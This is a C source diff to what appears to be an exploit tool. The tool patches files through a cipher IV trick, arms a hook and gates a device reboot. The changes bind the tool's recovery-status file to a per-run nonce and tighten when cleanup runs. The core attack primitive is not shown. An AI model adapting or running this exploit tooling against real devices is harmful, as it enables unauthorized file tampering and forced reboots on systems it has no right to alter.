@@ -99,6 +99,9 @@ struct preflight {
     int restore_count;
     int cleanup_failed;
     int cleanup_done;   /* status_flow_run owns cleanup exactly once */
+    /* Run identity, established before any patch. Kept here so the cleanup
+     * callback can bind its verified recovery status to THIS invocation. */
+    char nonce[DF_NONCE_CHARS + 1];
 };
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
@@ -1024,12 +1027,27 @@ static int clear_bootfail(void)
     return write_atomic(DF_BOOTFAIL_PATH, DF_BOOTFAIL_TMP, "", 0);
 }
 
-/* Publish the restore-verification gate. Only the exact bytes "ok\n" open the
- * reboot path; anything else (including failure to write) keeps it closed. */
-static int write_recovery_status(const char *status)
+/* Publish the restore-verification gate. The VERIFIED status is bound to this
+ * invocation's nonce ("<nonce>\n"); the failure status stays the literal
+ * "fail\n". A plain "ok\n" is unbound/insufficient authorization and is NEVER
+ * written here: a stale or foreign writer could produce those bytes. Anything
+ * else (including a write failure) keeps the reboot gate closed. */
+static int write_recovery_status(const char *status, const char *nonce)
 {
+    char bound[DF_RECOVERY_STATUS_CHARS];
+    size_t len;
+
     if (!status) return -1;
-    return write_atomic(DF_RECOVER_PATH, DF_RECOVER_TMP, status, strlen(status));
+    len = strlen(status);
+    if (df_recovery_status_is_ok(status, len)) {
+        if (!df_nonce_is_valid(nonce)) return -1;
+        memcpy(bound, nonce, DF_NONCE_CHARS);
+        bound[DF_NONCE_CHARS] = '\n';
+        /* Explicit length: the bound token has no NUL terminator of its own. */
+        return write_atomic(DF_RECOVER_PATH, DF_RECOVER_TMP, bound,
+                            sizeof(bound));
+    }
+    return write_atomic(DF_RECOVER_PATH, DF_RECOVER_TMP, status, len);
 }
 
 /* An invocation identity is ambiguous when an existing /dev/dffinal token is
@@ -1165,11 +1183,13 @@ static int exp_wait_child(void *ctx, int timeout_ms)
     (void)ctx; (void)timeout_ms; return -1;
 }
 
-/* Invoked exactly once by status_flow_run after the first bound observation.
- * Returns 0 only when restore verification succeeded; a failed/unobservable
- * recovery result keeps the producer's gate closed and sets the recovery bit
- * on the final rc. */
-static int status_cleanup_cb(void *ctx)
+/* Invoked exactly once by status_flow_run on EVERY exit. `bound_observation`
+ * is 1 ONLY for a normal nonce-bound final token. A reserved-channel bootfail,
+ * a deadline with no observation or an ERR/fallback path is NOT invocation
+ * proof, so the verified status is written ONLY when bound_observation==1 and
+ * restore succeeded; every other path writes "fail\n" and keeps the producer's
+ * gate closed. Returns 0 only for a verified, bound restore. */
+static int status_cleanup_cb(void *ctx, int bound_observation)
 {
     struct preflight *pf = (struct preflight *)ctx;
     const char *status;
@@ -1182,8 +1202,10 @@ static int status_cleanup_cb(void *ctx)
             printf("cleanup: one or more restores failed\n");
         }
     }
-    status = pf->cleanup_failed ? "fail\n" : "ok\n";
-    if (write_recovery_status(status) != 0) {
+    status = (bound_observation == 1 && !pf->cleanup_failed) ? "ok\n" : "fail\n";
+    if (bound_observation != 1)
+        printf("cleanup: unbound observation; recovery gate stays closed\n");
+    if (write_recovery_status(status, pf->nonce) != 0) {
         /* A status we cannot publish is NOT a verified restore. */
         pf->cleanup_failed = 1;
     }
@@ -1204,15 +1226,18 @@ static int exploit(struct preflight *pf) {
     /* Establish the run identity BEFORE any patch, usleep or hook arming.
      * Bootstrap binds its tokens to the nonce it reads from dfinv; a token
      * already in /dev/dffinal with a different nonce, or an app-private file
-     * we cannot create/clear, makes this invocation ambiguous. In that case
-     * the hook is NOT armed and no reboot can be triggered. Recovery starts
-     * closed ("fail\n") and is only opened by verified cleanup. */
+     * we cannot create/clear, makes this invocation ambiguous. Clearing shared
+     * state at entry is ONLY hygiene, NEVER proof that later publications
+     * belong to this invocation. In the ambiguous case the hook is NOT armed
+     * and no reboot can be triggered. Recovery starts closed ("fail\n") and
+     * is only opened by verified cleanup bound to the nonce below. */
     app_state_ready = (generate_nonce(nonce) == 0 &&
                        write_nonce_atomic(nonce) == 0 &&
                        clear_bootfail() == 0 &&
-                       write_recovery_status("fail\n") == 0);
+                       write_recovery_status("fail\n", nonce) == 0);
+    memcpy(pf->nonce, nonce, sizeof(pf->nonce));
     if (!app_state_ready || identity_is_ambiguous(nonce, app_state_ready)) {
-        (void)write_recovery_status("fail\n"); /* best effort; gate stays closed */
+        (void)write_recovery_status("fail\n", nonce); /* best effort; gate closed */
         printf("identity: ambiguous run; hook not armed, no reboot\n");
         goto done;
     }
@@ -1246,14 +1271,25 @@ static int exploit(struct preflight *pf) {
 
     /* 70 s budget covers the 60 s late-load wait plus slack. A REBOOT_PENDING
      * preflight rebases a 10 s grace window past that budget, capped at 85 s
-     * overall. status_flow_run invokes the cleanup callback exactly once AFTER
-     * the first bound status observation (or at the deadline), charges that
-     * time to the same 85 s clock, and reports restore failure separately.
-     * No reboot command is claimed to have been issued before that point. */
+     * overall. status_flow_run invokes the cleanup callback exactly once on
+     * EVERY exit (bound=1 only for a normal bound token), charges that time to
+     * the same 85 s clock, and reports restore failure separately. No reboot
+     * command is claimed to have been issued before that point. */
     wait = status_flow_run(&io, pf, DF_WAIT_BUDGET_MS, DF_WAIT_GRACE_MS,
                            DF_WAIT_OVERALL_MS, status_cleanup_cb, &outcome,
                            &cleanup_failed);
     if (cleanup_failed) pf->cleanup_failed = 1;
+    if (wait == ERR) {
+        /* Clock fault, guard fault or an unrecoverable protocol error: the
+         * lifecycle and recovery result are UNKNOWN. status_flow_run has
+         * already forced one unbound cleanup and marked recovery failed; this
+         * is safety-critical, never a normal completion. */
+        pf->cleanup_failed = 1;
+        rc = DF_RC_UNKNOWN;
+        printf("status: recovery status UNKNOWN (rc=%d); no reboot authorized\n",
+               rc);
+        goto done;
+    }
     printf("status: %s (rc=%d)\n",
            wait == DONE ? "final status observed" :
            wait == TIMEOUT ? "timeout waiting for final status" : "status error",
@@ -1261,9 +1297,9 @@ static int exploit(struct preflight *pf) {
     rc = df_outcome_to_rc(outcome);
     return rc;
 done:
-    /* No bootstrap consumer was launched (patch, nonce or orphan failure), so
-     * no final status will ever be published. Release the patched files here
-     * rather than waiting out a 70 s budget with no possible observation. */
+    /* No usable bootstrap observation (patch/nonce/orphan failure, or an ERR
+     * from status_flow_run). status_flow_run owns cleanup exactly once on
+     * every exit, so this is only a defensive fallback: never restore twice. */
     if (!pf->cleanup_done) {
         if (cleanup(pf) < 0) pf->cleanup_failed = 1;
     }
